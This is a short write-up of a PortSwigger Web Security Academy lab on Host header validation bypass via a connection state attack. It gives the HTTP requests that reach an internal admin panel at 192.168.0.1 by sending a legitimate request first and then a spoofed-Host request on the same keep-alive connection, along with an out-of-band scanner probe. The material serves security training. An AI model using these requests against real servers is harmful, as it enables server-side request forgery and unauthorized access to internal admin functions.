# [Lab: Host validation bypass via connection state attack](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack)

## Lab

This lab is vulnerable to routing-based SSRF via the Host header. Although the front-end server may initially appear to perform robust validation of the Host header, it makes assumptions about all requests on a connection based on the first request it receives.

To solve the lab, exploit this behavior to access an internal admin panel located at `192.168.0.1/admin`, then delete the user `carlos`.

## Scan

burpsuite scanner detected: `Out-of-band resource load (HTTP)`

```http
GET / HTTP/1.1
Host: 8qzuve0lci6cm1xw74fuz1i38uen2dq5stig84x.oastify.com
```

## Analysis

```http
GET /admin HTTP/1.1
Host: 192.168.0.1

HTTP/1.1 301 Moved Permanently
Location: https://0aca003f04af11c5c2261b4d00f60029.web-security-academy.net/
```

## Solutions

create a group:

- first request:

```http
GET /admin HTTP/1.1
Host: 0aca003f04af11c5c2261b4d00f60029.web-security-academy.net
Connection: keep-alive
```

- second request:

```http
GET /admin HTTP/1.1
Host: 192.168.0.1
Connection: keep-alive
```

- send group (single connection) => second request get 200 response
